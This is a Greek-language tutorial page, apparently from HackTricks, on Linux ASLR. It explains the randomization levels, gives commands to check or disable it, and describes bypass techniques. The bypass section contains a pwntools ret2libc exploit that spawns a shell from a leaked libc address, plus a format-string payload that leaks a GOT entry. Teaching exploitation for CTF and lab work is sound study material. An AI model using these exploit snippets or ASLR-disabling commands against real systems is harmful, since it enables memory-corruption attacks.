# ASLR

{{#include ../../../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

**Address Space Layout Randomization (ASLR)** είναι μια τεχνική ασφαλείας που χρησιμοποιείται σε λειτουργικά συστήματα για να **τυχαία τα διευθυντικά διαστήματα μνήμης** που χρησιμοποιούνται από διαδικασίες συστήματος και εφαρμογών. Με αυτόν τον τρόπο, καθιστά σημαντικά πιο δύσκολο για έναν επιτιθέμενο να προβλέψει την τοποθεσία συγκεκριμένων διαδικασιών και δεδομένων, όπως η στοίβα, η σωρός και οι βιβλιοθήκες, μειώνοντας έτσι ορισμένους τύπους εκμεταλλεύσεων, ιδιαίτερα τις υπερχειλίσεις μνήμης.

### **Έλεγχος Κατάστασης ASLR**

Για να **ελέγξετε** την κατάσταση ASLR σε ένα σύστημα Linux, μπορείτε να διαβάσετε την τιμή από το αρχείο `/proc/sys/kernel/randomize_va_space`. Η τιμή που αποθηκεύεται σε αυτό το αρχείο καθορίζει τον τύπο ASLR που εφαρμόζεται:

- **0**: Καμία τυχαιοποίηση. Όλα είναι στατικά.
- **1**: Συντηρητική τυχαιοποίηση. Οι κοινές βιβλιοθήκες, η στοίβα, το mmap(), η σελίδα VDSO τυχαία.
- **2**: Πλήρης τυχαιοποίηση. Εκτός από τα στοιχεία που τυχαία από τη συντηρητική τυχαιοποίηση, η μνήμη που διαχειρίζεται μέσω του `brk()` τυχαία.

Μπορείτε να ελέγξετε την κατάσταση ASLR με την παρακάτω εντολή:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Απενεργοποίηση ASLR**

Για να **απενεργοποιήσετε** το ASLR, ορίστε την τιμή του `/proc/sys/kernel/randomize_va_space` σε **0**. Η απενεργοποίηση του ASLR γενικά δεν συνιστάται εκτός από σενάρια δοκιμών ή αποσφαλμάτωσης. Ακολουθούν οι οδηγίες για να το απενεργοποιήσετε:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Μπορείτε επίσης να απενεργοποιήσετε το ASLR για μια εκτέλεση με:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Ενεργοποίηση ASLR**

Για να **ενεργοποιήσετε** το ASLR, μπορείτε να γράψετε μια τιμή **2** στο αρχείο `/proc/sys/kernel/randomize_va_space`. Αυτό συνήθως απαιτεί δικαιώματα root. Η πλήρης τυχαία κατανομή μπορεί να γίνει με την ακόλουθη εντολή:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Επιμονή Μετά από Επανεκκινήσεις**

Οι αλλαγές που γίνονται με τις εντολές `echo` είναι προσωρινές και θα επαναρυθμιστούν κατά την επανεκκίνηση. Για να κάνετε την αλλαγή μόνιμη, πρέπει να επεξεργαστείτε το αρχείο `/etc/sysctl.conf` και να προσθέσετε ή να τροποποιήσετε την παρακάτω γραμμή:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Μετά την επεξεργασία του `/etc/sysctl.conf`, εφαρμόστε τις αλλαγές με:
```bash
sudo sysctl -p
```
Αυτό θα διασφαλίσει ότι οι ρυθμίσεις ASLR σας παραμένουν κατά τη διάρκεια των επανεκκινήσεων.

## **Παρακάμψεις**

### 32bit brute-forcing

Το PaX χωρίζει τον χώρο διευθύνσεων της διαδικασίας σε **3 ομάδες**:

- **Κώδικας και δεδομένα** (αρχικοποιημένα και μη αρχικοποιημένα): `.text`, `.data`, και `.bss` —> **16 bits** εντροπίας στη μεταβλητή `delta_exec`. Αυτή η μεταβλητή αρχικοποιείται τυχαία με κάθε διαδικασία και προστίθεται στις αρχικές διευθύνσεις.
- **Μνήμη** που έχει κατανεμηθεί από το `mmap()` και **κοινές βιβλιοθήκες** —> **16 bits**, ονομάζεται `delta_mmap`.
- **Η στοίβα** —> **24 bits**, αναφέρεται ως `delta_stack`. Ωστόσο, χρησιμοποιεί αποτελεσματικά **11 bits** (από το 10ο έως το 20ό byte συμπεριλαμβανομένου), ευθυγραμμισμένο σε **16 bytes** —> Αυτό έχει ως αποτέλεσμα **524,288 δυνατές πραγματικές διευθύνσεις στοίβας**.

Τα προηγούμενα δεδομένα αφορούν συστήματα 32-bit και η μειωμένη τελική εντροπία καθιστά δυνατή την παράκαμψη του ASLR δοκιμάζοντας την εκτέλεση ξανά και ξανά μέχρι να ολοκληρωθεί επιτυχώς η εκμετάλλευση.

#### Ιδέες brute-force:

- Εάν έχετε μια αρκετά μεγάλη υπερχείλιση για να φιλοξενήσει μια **μεγάλη NOP sled πριν από τον κώδικα shell**, θα μπορούσατε απλώς να κάνετε brute-force διευθύνσεις στη στοίβα μέχρι η ροή **να πηδήξει πάνω από κάποιο μέρος της NOP sled**.
- Μια άλλη επιλογή για αυτό σε περίπτωση που η υπερχείλιση δεν είναι τόσο μεγάλη και η εκμετάλλευση μπορεί να εκτελείται τοπικά είναι να **προσθέσετε την NOP sled και τον κώδικα shell σε μια μεταβλητή περιβάλλοντος**.
- Εάν η εκμετάλλευση είναι τοπική, μπορείτε να προσπαθήσετε να κάνετε brute-force τη βασική διεύθυνση της libc (χρήσιμο για συστήματα 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Αν επιτίθεστε σε έναν απομακρυσμένο διακομιστή, μπορείτε να προσπαθήσετε να **brute-force την διεύθυνση της συνάρτησης `libc` `usleep`**, περνώντας ως επιχείρημα 10 (για παράδειγμα). Αν σε κάποιο σημείο ο **διακομιστής χρειαστεί 10 δευτερόλεπτα επιπλέον για να απαντήσει**, βρήκατε τη διεύθυνση αυτής της συνάρτησης.

> [!TIP]
> Σε συστήματα 64bit η εντροπία είναι πολύ υψηλότερη και αυτό δεν είναι δυνατό.

### Τοπικές Πληροφορίες (`/proc/[pid]/stat`)

Το αρχείο **`/proc/[pid]/stat`** μιας διαδικασίας είναι πάντα αναγνώσιμο από όλους και **περιέχει ενδιαφέρουσες** πληροφορίες όπως:

- **startcode** & **endcode**: Διευθύνσεις πάνω και κάτω με το **TEXT** του δυαδικού
- **startstack**: Η διεύθυνση της αρχής της **στοίβας**
- **start_data** & **end_data**: Διευθύνσεις πάνω και κάτω όπου είναι το **BSS**
- **kstkesp** & **kstkeip**: Τρέχουσες διευθύνσεις **ESP** και **EIP**
- **arg_start** & **arg_end**: Διευθύνσεις πάνω και κάτω όπου είναι τα **cli arguments**.
- **env_start** &**env_end**: Διευθύνσεις πάνω και κάτω όπου είναι οι **env variables**.

Επομένως, αν ο επιτιθέμενος βρίσκεται στον ίδιο υπολογιστή με το δυαδικό που εκμεταλλεύεται και αυτό το δυαδικό δεν περιμένει την υπερχείλιση από τις ακατέργαστες παραμέτρους, αλλά από μια διαφορετική **είσοδο που μπορεί να κατασκευαστεί μετά την ανάγνωση αυτού του αρχείου**. Είναι δυνατόν για έναν επιτιθέμενο να **πάρε κάποια διευθύνσεις από αυτό το αρχείο και να κατασκευάσει offsets από αυτές για την εκμετάλλευση**.

> [!TIP]
> Για περισσότερες πληροφορίες σχετικά με αυτό το αρχείο, ελέγξτε [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) αναζητώντας το `/proc/pid/stat`

### Έχοντας μια διαρροή

- **Η πρόκληση είναι να δώσετε μια διαρροή**

Αν σας δοθεί μια διαρροή (εύκολες προκλήσεις CTF), μπορείτε να υπολογίσετε offsets από αυτήν (υποθέτοντας για παράδειγμα ότι γνωρίζετε την ακριβή έκδοση της libc που χρησιμοποιείται στο σύστημα που εκμεταλλεύεστε). Αυτή η εκμετάλλευση παραδείγματος είναι αποσπασμένη από το [**παράδειγμα από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (ελέγξτε αυτή τη σελίδα για περισσότερες λεπτομέρειες):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
- **ret2plt**

Καταχρώντας μια υπερχείλιση buffer, θα ήταν δυνατό να εκμεταλλευτεί κανείς ένα **ret2plt** για να εξάγει μια διεύθυνση μιας συνάρτησης από τη libc. Έλεγχος:

{{#ref}}
ret2plt.md
{{#endref}}

- **Format Strings Arbitrary Read**

Ακριβώς όπως στο ret2plt, αν έχετε μια αυθαίρετη ανάγνωση μέσω μιας ευπάθειας format strings, είναι δυνατό να εξάγετε τη διεύθυνση μιας **libc function** από το GOT. Το παρακάτω [**παράδειγμα είναι από εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Μπορείτε να βρείτε περισσότερες πληροφορίες σχετικά με το Format Strings arbitrary read στο:

{{#ref}}
../../format-strings/
{{#endref}}

### Ret2ret & Ret2pop

Δοκιμάστε να παρακάμψετε το ASLR εκμεταλλευόμενοι διευθύνσεις μέσα στη στοίβα:

{{#ref}}
../../stack-overflow/ret2ret.md
{{#endref}}

{{#include ../../../../banners/hacktricks-training.md}}
